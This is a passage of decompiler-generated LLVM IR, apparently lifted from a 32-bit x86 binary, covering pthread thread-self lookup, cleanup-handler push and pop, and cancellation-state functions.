  %v4_804e275 = call i32 @memcpy(i16* %v3_804e275, i32 %v0_804e260, i32 4)
  br label %dec_label_pc_804e286

dec_label_pc_804e281:                             ; preds = %dec_label_pc_804e269, %entry
  br label %dec_label_pc_804e286

dec_label_pc_804e286:                             ; preds = %dec_label_pc_804e26d, %dec_label_pc_804e281
  %v0_804e289 = phi i32 [ 0, %dec_label_pc_804e26d ], [ 22, %dec_label_pc_804e281 ]
  ret i32 %v0_804e289

; uselistorder directives
  uselistorder label %dec_label_pc_804e286, { 1, 0 }
}

define i32 @thread_self.8(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_804e28c = load i32, i32* @esp, align 4
  %v1_804e28c = load i32, i32* @global_var_806338c.133, align 4
  %v7_804e28c = icmp ult i32 %v0_804e28c, %v1_804e28c
  %v1_804e292 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_804e292, i32* @edx, align 4
  %v1_804e299 = icmp eq i1 %v7_804e28c, false
  br i1 %v1_804e299, label %dec_label_pc_804e2ca, label %dec_label_pc_804e29b

dec_label_pc_804e29b:                             ; preds = %entry
  %v1_804e29b = load i32, i32* @global_var_8063390.134, align 16
  %v7_804e29b = icmp ult i32 %v0_804e28c, %v1_804e29b
  br i1 %v7_804e29b, label %dec_label_pc_804e2b0, label %dec_label_pc_804e2a3

dec_label_pc_804e2a3:                             ; preds = %dec_label_pc_804e29b
  %v1_804e2a3 = load i32, i32* @global_var_8063394.135, align 4
  %v7_804e2a3 = icmp ult i32 %v0_804e28c, %v1_804e2a3
  br i1 %v7_804e2a3, label %dec_label_pc_804e2ca, label %dec_label_pc_804e2b0

dec_label_pc_804e2b0:                             ; preds = %dec_label_pc_804e2a3, %dec_label_pc_804e29b
  %v0_804e2b0 = load i32, i32* @global_var_80679f0.137, align 16
  %v1_804e2b0 = icmp eq i32 %v0_804e2b0, 0
  br i1 %v1_804e2b0, label %dec_label_pc_804e2be, label %dec_label_pc_804e2b9

dec_label_pc_804e2b9:                             ; preds = %dec_label_pc_804e2b0
  %v0_804e2b9 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804e2be

dec_label_pc_804e2be:                             ; preds = %dec_label_pc_804e2b0, %dec_label_pc_804e2b9
  %v3_804e2be = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_804e2be, i32* @edx, align 4
  %v2_804e2c4 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804e2ca

dec_label_pc_804e2ca:                             ; preds = %dec_label_pc_804e2a3, %entry, %dec_label_pc_804e2be
  %v0_804e2ca = phi i32 [ ptrtoint (i32* @global_var_80628a0.136 to i32), %dec_label_pc_804e2a3 ], [ ptrtoint (i32* @global_var_80626c0 to i32), %entry ], [ %v2_804e2c4, %dec_label_pc_804e2be ]
  ret i32 %v0_804e2ca

; uselistorder directives
  uselistorder label %dec_label_pc_804e2ca, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e2be, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804e2cb = load i32, i32* @edi, align 4
  %v0_804e2cc = load i32, i32* @esi, align 4
  %v0_804e2cd = load i32, i32* @ebx, align 4
  store i32 %v0_804e2cd, i32* %stack_var_-12, align 4
  %v1_804e2ce = call i32 @thread_self.8(i32 %v0_804e2cd)
  store i32 %v1_804e2ce, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_804e2d7 = add i32 %v1_804e2ce, 60
  %v2_804e2d7 = inttoptr i32 %v1_804e2d7 to i32*
  %v3_804e2d7 = load i32, i32* %v2_804e2d7, align 4
  store i32 %v3_804e2d7, i32* %ebx.global-to-local, align 4
  store i32 %v1_804e2ce, i32* %esi.global-to-local, align 4
  %v1_804e2f02 = icmp eq i32 %v3_804e2d7, 0
  %v1_804e2f29 = icmp eq i1 %v1_804e2f02, false
  br i1 %v1_804e2f29, label %dec_label_pc_804e2de.lr.ph, label %dec_label_pc_804e2f4

dec_label_pc_804e2de.lr.ph:                       ; preds = %entry
  %tmp = icmp ugt i32 %v3_804e2d7, %arg1
  br i1 %tmp, label %dec_label_pc_804e2e2.lr.ph, label %dec_label_pc_804e2f4.loopexit

dec_label_pc_804e2e2.lr.ph:                       ; preds = %dec_label_pc_804e2de.lr.ph
  br label %dec_label_pc_804e2e2

dec_label_pc_804e2e2:                             ; preds = %dec_label_pc_804e2e2.dec_label_pc_804e2de_crit_edge, %dec_label_pc_804e2e2.lr.ph
  %v4_804e2e830 = phi i32 [ %v3_804e2d7, %dec_label_pc_804e2e2.lr.ph ], [ %v3_804e2ea, %dec_label_pc_804e2e2.dec_label_pc_804e2de_crit_edge ]
  %v5_804e2e8 = inttoptr i32 %v4_804e2e830 to i32*
  %v6_804e2e8 = load i32, i32* %v5_804e2e8, align 4
  call void @__pseudo_call(i32 %v6_804e2e8)
  %v0_804e2ea = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e2ea = add i32 %v0_804e2ea, 12
  %v2_804e2ea = inttoptr i32 %v1_804e2ea to i32*
  %v3_804e2ea = load i32, i32* %v2_804e2ea, align 4
  store i32 %v3_804e2ea, i32* %ebx.global-to-local, align 4
  %v1_804e2f0 = icmp eq i32 %v3_804e2ea, 0
  %v1_804e2f2 = icmp eq i1 %v1_804e2f0, false
  br i1 %v1_804e2f2, label %dec_label_pc_804e2e2.dec_label_pc_804e2de_crit_edge, label %dec_label_pc_804e2f4.loopexit

dec_label_pc_804e2e2.dec_label_pc_804e2de_crit_edge: ; preds = %dec_label_pc_804e2e2
  %v1_804e2de.pre = load i32, i32* %edi.global-to-local, align 4
  %tmp33 = icmp ugt i32 %v3_804e2ea, %v1_804e2de.pre
  br i1 %tmp33, label %dec_label_pc_804e2e2, label %dec_label_pc_804e2f4.loopexit

dec_label_pc_804e2f4.loopexit:                    ; preds = %dec_label_pc_804e2e2.dec_label_pc_804e2de_crit_edge, %dec_label_pc_804e2de.lr.ph, %dec_label_pc_804e2e2
  %v0_804e2f4.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e2f4

dec_label_pc_804e2f4:                             ; preds = %dec_label_pc_804e2f4.loopexit, %entry
  %v0_804e2f4 = phi i32 [ %v0_804e2f4.pre, %dec_label_pc_804e2f4.loopexit ], [ %v1_804e2ce, %entry ]
  %v1_804e2f4 = add i32 %v0_804e2f4, 372
  %v2_804e2f4 = inttoptr i32 %v1_804e2f4 to i32*
  %v3_804e2f4 = load i32, i32* %v2_804e2f4, align 4
  %v4_804e2f4 = icmp eq i32 %v3_804e2f4, 0
  br i1 %v4_804e2f4, label %dec_label_pc_804e2f4.dec_label_pc_804e305_crit_edge, label %dec_label_pc_804e2fd

dec_label_pc_804e2f4.dec_label_pc_804e305_crit_edge: ; preds = %dec_label_pc_804e2f4
  %v0_804e308.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e305

dec_label_pc_804e2fd:                             ; preds = %dec_label_pc_804e2f4
  %v2_804e2fd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e2fd, i32* @ebx, align 4
  store i32 %v0_804e2cc, i32* @esi, align 4
  store i32 %v0_804e2cb, i32* @edi, align 4
  %v0_804e300 = call i32 @__rpc_thread_destroy()
  store i32 %v0_804e300, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e305

dec_label_pc_804e305:                             ; preds = %dec_label_pc_804e2f4.dec_label_pc_804e305_crit_edge, %dec_label_pc_804e2fd
  %v0_804e308 = phi i32 [ %v0_804e308.pre, %dec_label_pc_804e2f4.dec_label_pc_804e305_crit_edge ], [ %v0_804e300, %dec_label_pc_804e2fd ]
  %v2_804e305 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e305, i32* @ebx, align 4
  store i32 %v0_804e2cc, i32* @esi, align 4
  store i32 %v0_804e2cb, i32* @edi, align 4
  ret i32 %v0_804e308

; uselistorder directives
  uselistorder i32 %v3_804e2ea, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804e2d7, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e2cc, { 1, 0 }
  uselistorder i32 %v0_804e2cb, { 1, 0 }
  uselistorder label %dec_label_pc_804e305, { 1, 0 }
  uselistorder label %dec_label_pc_804e2f4.loopexit, { 0, 2, 1 }
}

define i32 @__pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e309 = load i32, i32* @ebx, align 4
  store i32 %v0_804e309, i32* %stack_var_-4, align 4
  %v1_804e30d = call i32 @thread_self.8(i32 %v0_804e309)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_804e30d, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_804e322 = add i32 %tmp3, 4
  %v3_804e322 = inttoptr i32 %v2_804e322 to i32*
  store i32 %arg3, i32* %v3_804e322, align 4
  %v0_804e325 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e325 = add i32 %v0_804e325, 65
  %v2_804e325 = inttoptr i32 %v1_804e325 to i8*
  %v3_804e325 = load i8, i8* %v2_804e325, align 1
  %v4_804e325 = sext i8 %v3_804e325 to i32
  %v1_804e329 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e329 = add i32 %v1_804e329, 8
  %v3_804e329 = inttoptr i32 %v2_804e329 to i32*
  store i32 %v4_804e325, i32* %v3_804e329, align 4
  %v0_804e32c = load i32, i32* %edx.global-to-local, align 4
  %v1_804e32c = add i32 %v0_804e32c, 60
  %v2_804e32c = inttoptr i32 %v1_804e32c to i32*
  %v3_804e32c = load i32, i32* %v2_804e32c, align 4
  %v1_804e32f = icmp eq i32 %v3_804e32c, 0
  %v1_804e331 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e331 = add i32 %v1_804e331, 12
  %v3_804e331 = inttoptr i32 %v2_804e331 to i32*
  store i32 %v3_804e32c, i32* %v3_804e331, align 4
  br i1 %v1_804e32f, label %dec_label_pc_804e341, label %dec_label_pc_804e336

dec_label_pc_804e336:                             ; preds = %entry
  %v0_804e336 = load i32, i32* %ebx.global-to-local, align 4
  %v7_804e336 = icmp ult i32 %v0_804e336, %v3_804e32c
  br i1 %v7_804e336, label %dec_label_pc_804e341, label %dec_label_pc_804e33a

dec_label_pc_804e33a:                             ; preds = %dec_label_pc_804e336
  %v1_804e33a = add i32 %v0_804e336, 12
  %v2_804e33a = inttoptr i32 %v1_804e33a to i32*
  store i32 0, i32* %v2_804e33a, align 4
  br label %dec_label_pc_804e341

dec_label_pc_804e341:                             ; preds = %dec_label_pc_804e336, %entry, %dec_label_pc_804e33a
  %v0_804e341 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e341 = add i32 %v0_804e341, 65
  %v2_804e341 = inttoptr i32 %v1_804e341 to i8*
  store i8 0, i8* %v2_804e341, align 1
  %v0_804e345 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e345 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e345 = add i32 %v1_804e345, 60
  %v3_804e345 = inttoptr i32 %v2_804e345 to i32*
  store i32 %v0_804e345, i32* %v3_804e345, align 4
  %v2_804e348 = load i32, i32* %stack_var_-12, align 4
  %v2_804e34a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e34a, i32* @ebx, align 4
  ret i32 %v2_804e348

; uselistorder directives
  uselistorder label %dec_label_pc_804e341, { 2, 0, 1 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v4_804e350 = icmp eq i32 %arg2, 0
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  br i1 %v4_804e350, label %dec_label_pc_804e366, label %dec_label_pc_804e35b

dec_label_pc_804e35b:                             ; preds = %entry
  %v6_804e361 = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_804e361)
  br label %dec_label_pc_804e366

dec_label_pc_804e366:                             ; preds = %entry, %dec_label_pc_804e35b
  %v0_804e366 = phi i32 [ %tmp7, %entry ], [ 134538083, %dec_label_pc_804e35b ]
  %v1_804e366 = call i32 @thread_self.8(i32 %v0_804e366)
  %v0_804e36b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e36b = add i32 %v0_804e36b, 12
  %v2_804e36b = inttoptr i32 %v1_804e36b to i32*
  %v3_804e36b = load i32, i32* %v2_804e36b, align 4
  %v2_804e36e = add i32 %v1_804e366, 60
  %v3_804e36e = inttoptr i32 %v2_804e36e to i32*
  store i32 %v3_804e36b, i32* %v3_804e36e, align 4
  %v2_804e371 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e371, i32* @ecx, align 4
  ret i32 %v1_804e366

; uselistorder directives
  uselistorder label %dec_label_pc_804e366, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e375 = load i32, i32* @ebx, align 4
  store i32 %v0_804e375, i32* %stack_var_-4, align 4
  %v1_804e379 = call i32 @thread_self.8(i32 %v0_804e375)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_804e379, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_804e38e = add i32 %tmp3, 4
  %v3_804e38e = inttoptr i32 %v2_804e38e to i32*
  store i32 %arg3, i32* %v3_804e38e, align 4
  %v0_804e391 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e391 = add i32 %v0_804e391, 60
  %v2_804e391 = inttoptr i32 %v1_804e391 to i32*
  %v3_804e391 = load i32, i32* %v2_804e391, align 4
  %v1_804e394 = icmp eq i32 %v3_804e391, 0
  %v1_804e396 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e396 = add i32 %v1_804e396, 12
  %v3_804e396 = inttoptr i32 %v2_804e396 to i32*
  store i32 %v3_804e391, i32* %v3_804e396, align 4
  br i1 %v1_804e394, label %dec_label_pc_804e3a6, label %dec_label_pc_804e39b

dec_label_pc_804e39b:                             ; preds = %entry
  %v0_804e39b = load i32, i32* %ebx.global-to-local, align 4
  %v7_804e39b = icmp ult i32 %v0_804e39b, %v3_804e391
  br i1 %v7_804e39b, label %dec_label_pc_804e3a6, label %dec_label_pc_804e39f

dec_label_pc_804e39f:                             ; preds = %dec_label_pc_804e39b
  %v1_804e39f = add i32 %v0_804e39b, 12
  %v2_804e39f = inttoptr i32 %v1_804e39f to i32*
  store i32 0, i32* %v2_804e39f, align 4
  br label %dec_label_pc_804e3a6

dec_label_pc_804e3a6:                             ; preds = %entry, %dec_label_pc_804e39b, %dec_label_pc_804e39f
  %v0_804e3a6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e3a6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e3a6 = add i32 %v1_804e3a6, 60
  %v3_804e3a6 = inttoptr i32 %v2_804e3a6 to i32*
  store i32 %v0_804e3a6, i32* %v3_804e3a6, align 4
  %v2_804e3a9 = load i32, i32* %stack_var_-12, align 4
  %v2_804e3ab = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e3ab, i32* @ebx, align 4
  ret i32 %v2_804e3a9

; uselistorder directives
  uselistorder i32* %edx.global-to-local, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804e3a6, { 2, 1, 0 }
}

define i32 @__pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e3ae = load i32, i32* @ebx, align 4
  store i32 %v0_804e3ae, i32* %stack_var_-8, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_804e3af = ptrtoint i32* %stack_var_-12 to i32
  %v1_804e3b2 = call i32 @thread_self.8(i32 %v0_804e3ae)
  store i32 %v1_804e3b2, i32* %eax.global-to-local, align 4
  store i32 %tmp4, i32* @esi, align 4
  %v4_804e3bb = icmp eq i32 %arg2, 0
  store i1 %v4_804e3bb, i1* %zf.global-to-local, align 1
  store i32 %v1_804e3b2, i32* @ebx, align 4
  br i1 %v4_804e3bb, label %dec_label_pc_804e3cf, label %dec_label_pc_804e3c4

dec_label_pc_804e3c4:                             ; preds = %entry
  %v0_804e3c4 = load i32, i32* @esp, align 4
  %v9_804e3c4 = icmp eq i32 %v0_804e3c4, 12
  store i1 %v9_804e3c4, i1* %zf.global-to-local, align 1
  %v6_804e3ca = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_804e3ca)
  %v0_804e3cc = load i32, i32* @esp, align 4
  %v6_804e3cc = icmp eq i32 %v0_804e3cc, -16
  store i1 %v6_804e3cc, i1* %zf.global-to-local, align 1
  %v0_804e3cf.pre = load i32, i32* @esi, align 4
  %v0_804e3d2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e3cf

dec_label_pc_804e3cf:                             ; preds = %entry, %dec_label_pc_804e3c4
  %v1_804e3d6 = phi i32 [ %v1_804e3b2, %entry ], [ %v0_804e3d2.pre, %dec_label_pc_804e3c4 ]
  %v0_804e3cf = phi i32 [ %tmp4, %entry ], [ %v0_804e3cf.pre, %dec_label_pc_804e3c4 ]
  %v1_804e3cf = add i32 %v0_804e3cf, 12
  %v2_804e3cf = inttoptr i32 %v1_804e3cf to i32*
  %v3_804e3cf = load i32, i32* %v2_804e3cf, align 4
  store i32 %v3_804e3cf, i32* %eax.global-to-local, align 4
  %v1_804e3d2 = add i32 %v1_804e3d6, 66
  %v2_804e3d2 = inttoptr i32 %v1_804e3d2 to i8*
  %v3_804e3d2 = load i8, i8* %v2_804e3d2, align 1
  %v4_804e3d2 = icmp eq i8 %v3_804e3d2, 0
  store i1 %v4_804e3d2, i1* %zf.global-to-local, align 1
  %v2_804e3d6 = add i32 %v1_804e3d6, 60
  %v3_804e3d6 = inttoptr i32 %v2_804e3d6 to i32*
  store i32 %v3_804e3cf, i32* %v3_804e3d6, align 4
  %v0_804e3d9 = load i32, i32* @esi, align 4
  %v1_804e3d9 = add i32 %v0_804e3d9, 8
  %v2_804e3d9 = inttoptr i32 %v1_804e3d9 to i32*
  %v3_804e3d9 = load i32, i32* %v2_804e3d9, align 4
  store i32 %v3_804e3d9, i32* %eax.global-to-local, align 4
  %v1_804e3dc = trunc i32 %v3_804e3d9 to i8
  %v2_804e3dc = load i32, i32* @ebx, align 4
  %v3_804e3dc = add i32 %v2_804e3dc, 65
  %v4_804e3dc = inttoptr i32 %v3_804e3dc to i8*
  store i8 %v1_804e3dc, i8* %v4_804e3dc, align 1
  %v0_804e3df = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804e3df, label %dec_label_pc_804e3f7, label %dec_label_pc_804e3e1

dec_label_pc_804e3e1:                             ; preds = %dec_label_pc_804e3cf
  %v0_804e3e1 = load i32, i32* @ebx, align 4
  %v1_804e3e1 = add i32 %v0_804e3e1, 64
  %v2_804e3e1 = inttoptr i32 %v1_804e3e1 to i16*
  %v3_804e3e1 = load i16, i16* %v2_804e3e1, align 2
  %v9_804e3e1 = icmp eq i16 %v3_804e3e1, 256
  store i1 %v9_804e3e1, i1* %zf.global-to-local, align 1
  %v1_804e3e7 = icmp eq i1 %v9_804e3e1, false
  br i1 %v1_804e3e7, label %dec_label_pc_804e3f7, label %dec_label_pc_804e3e9

dec_label_pc_804e3e9:                             ; preds = %dec_label_pc_804e3e1
  store i32 %v15_804e3af, i32* %eax.global-to-local, align 4
  %v2_804e3f2 = call i32 @__pthread_do_exit(i32 -1, i32 %v15_804e3af)
  store i32 %v2_804e3f2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e3f7

dec_label_pc_804e3f7:                             ; preds = %dec_label_pc_804e3e1, %dec_label_pc_804e3cf, %dec_label_pc_804e3e9
  %v2_804e3f7 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e3f7, i32* @ecx, align 4
  %v2_804e3f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e3f8, i32* @ebx, align 4
  %v2_804e3f9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e3f9, i32* @esi, align 4
  %v0_804e3fa = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804e3fa

; uselistorder directives
  uselistorder i1 %v9_804e3e1, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_804e3f7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e3cf, { 1, 0 }
}

define i32 @pthread_testcancel() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_804e3fe = call i32 @thread_self.8(i32 ptrtoint (i32* @0 to i32))
  %v1_804e403 = add i32 %v1_804e3fe, 66
  %v2_804e403 = inttoptr i32 %v1_804e403 to i8*
  %v3_804e403 = load i8, i8* %v2_804e403, align 1
  %v4_804e403 = icmp eq i8 %v3_804e403, 0
  br i1 %v4_804e403, label %dec_label_pc_804e41d, label %dec_label_pc_804e409

dec_label_pc_804e409:                             ; preds = %entry
  %v1_804e409 = add i32 %v1_804e3fe, 64
  %v2_804e409 = inttoptr i32 %v1_804e409 to i8*
  %v3_804e409 = load i8, i8* %v2_804e409, align 1
  %v4_804e409 = icmp eq i8 %v3_804e409, 0
  %v1_804e40d = icmp eq i1 %v4_804e409, false
  br i1 %v1_804e40d, label %dec_label_pc_804e41d, label %dec_label_pc_804e40f

dec_label_pc_804e40f:                             ; preds = %dec_label_pc_804e409
  %v2_804e411 = ptrtoint i32* %stack_var_0 to i32
  %v2_804e418 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_804e411)
  br label %dec_label_pc_804e41d

dec_label_pc_804e41d:                             ; preds = %dec_label_pc_804e409, %entry, %dec_label_pc_804e40f
  %v0_804e420 = phi i32 [ %v1_804e3fe, %dec_label_pc_804e409 ], [ %v1_804e3fe, %entry ], [ %v2_804e418, %dec_label_pc_804e40f ]
  ret i32 %v0_804e420

; uselistorder directives
  uselistorder label %dec_label_pc_804e41d, { 2, 0, 1 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804e421 = load i32, i32* @ebx, align 4
  store i32 %v0_804e421, i32* %stack_var_-4, align 4
  %v4_804e421 = ptrtoint i32* %stack_var_-4 to i32
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804e42a = sext i8 %arg1 to i32
  %v13_804e42a = icmp eq i8 %arg1, 1
  store i1 %v13_804e42a, i1* %zf.global-to-local, align 1
  store i32 %arg2, i32* @ebx, align 4
  %tmp14 = or i8 %arg1, 1
  %tmp15 = icmp eq i8 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804e435, label %dec_label_pc_804e46b

dec_label_pc_804e435:                             ; preds = %entry
  %v1_804e435 = call i32 @thread_self.8(i32 %v0_804e421)
  store i32 %v1_804e435, i32* %eax.global-to-local, align 4
  %v1_804e43a = icmp eq i32 %arg2, 0
  store i1 %v1_804e43a, i1* %zf.global-to-local, align 1
  store i32 %v1_804e435, i32* %edx.global-to-local, align 4
  br i1 %v1_804e43a, label %dec_label_pc_804e446, label %dec_label_pc_804e440

dec_label_pc_804e440:                             ; preds = %dec_label_pc_804e435
  %v1_804e440 = add i32 %v1_804e435, 65
  %v2_804e440 = inttoptr i32 %v1_804e440 to i8*
  %v3_804e440 = load i8, i8* %v2_804e440, align 1
  %v4_804e440 = sext i8 %v3_804e440 to i32
  store i32 %v4_804e440, i32* %eax.global-to-local, align 4
  %v2_804e444 = inttoptr i32 %arg2 to i32*
  store i32 %v4_804e440, i32* %v2_804e444, align 4
  %v6_804e446.pre = load i32, i32* %eax.global-to-local, align 4
  %v0_804e44a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e446

dec_label_pc_804e446:                             ; preds = %dec_label_pc_804e435, %dec_label_pc_804e440
  %v2_804e44e = phi i32 [ %v1_804e435, %dec_label_pc_804e435 ], [ %v0_804e44a.pre, %dec_label_pc_804e440 ]
  %v6_804e446 = phi i32 [ %v1_804e435, %dec_label_pc_804e435 ], [ %v6_804e446.pre, %dec_label_pc_804e440 ]
  %v7_804e446 = and i32 %v6_804e446, -256
  %v8_804e446 = or i32 %v7_804e446, %v4_804e42a
  store i32 %v8_804e446, i32* %eax.global-to-local, align 4
  %v1_804e44a = add i32 %v2_804e44e, 66
  %v2_804e44a = inttoptr i32 %v1_804e44a to i8*
  %v3_804e44a = load i8, i8* %v2_804e44a, align 1
  %v4_804e44a = icmp eq i8 %v3_804e44a, 0
  store i1 %v4_804e44a, i1* %zf.global-to-local, align 1
  %v3_804e44e = add i32 %v2_804e44e, 65
  %v4_804e44e = inttoptr i32 %v3_804e44e to i8*
  store i8 %arg1, i8* %v4_804e44e, align 1
  %v0_804e451 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804e451, label %dec_label_pc_804e469, label %dec_label_pc_804e453

dec_label_pc_804e453:                             ; preds = %dec_label_pc_804e446
  %v0_804e453 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e453 = add i32 %v0_804e453, 64
  %v2_804e453 = inttoptr i32 %v1_804e453 to i16*
  %v3_804e453 = load i16, i16* %v2_804e453, align 2
  %v9_804e453 = icmp eq i16 %v3_804e453, 256
  store i1 %v9_804e453, i1* %zf.global-to-local, align 1
  %v1_804e459 = icmp eq i1 %v9_804e453, false
  br i1 %v1_804e459, label %dec_label_pc_804e469, label %dec_label_pc_804e45b

dec_label_pc_804e45b:                             ; preds = %dec_label_pc_804e453
  store i32 %v4_804e421, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-28, align 4
  %v2_804e464 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804e421)
  store i32 %v2_804e464, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e469

dec_label_pc_804e469:                             ; preds = %dec_label_pc_804e453, %dec_label_pc_804e446, %dec_label_pc_804e45b
  %stack_var_-20.0 = phi i32 [ %tmp10, %dec_label_pc_804e446 ], [ %tmp10, %dec_label_pc_804e453 ], [ %arg2, %dec_label_pc_804e45b ]
  %stack_var_-24.0 = phi i32 [ %tmp9, %dec_label_pc_804e446 ], [ %tmp9, %dec_label_pc_804e453 ], [ %v4_804e421, %dec_label_pc_804e45b ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804e46b.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804e46b

dec_label_pc_804e46b:                             ; preds = %entry, %dec_label_pc_804e469
  %v2_804e46d = phi i32 [ %tmp10, %entry ], [ %stack_var_-20.0, %dec_label_pc_804e469 ]
  %v2_804e46c = phi i32 [ %tmp9, %entry ], [ %stack_var_-24.0, %dec_label_pc_804e469 ]
  %v2_804e46b = phi i32 [ %tmp8, %entry ], [ %v2_804e46b.pre, %dec_label_pc_804e469 ]
  %v0_804e46e = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804e469 ]
  store i32 %v2_804e46b, i32* @edx, align 4
  store i32 %v2_804e46c, i32* @ecx, align 4
  store i32 %v2_804e46d, i32* @ebx, align 4
  ret i32 %v0_804e46e

; uselistorder directives
  uselistorder i1 %v9_804e453, { 1, 0 }
  uselistorder i32 %v1_804e435, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp10, { 2, 0, 1 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 3, 1 }
  uselistorder i8 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804e46b, { 1, 0 }
  uselistorder label %dec_label_pc_804e469, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e446, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
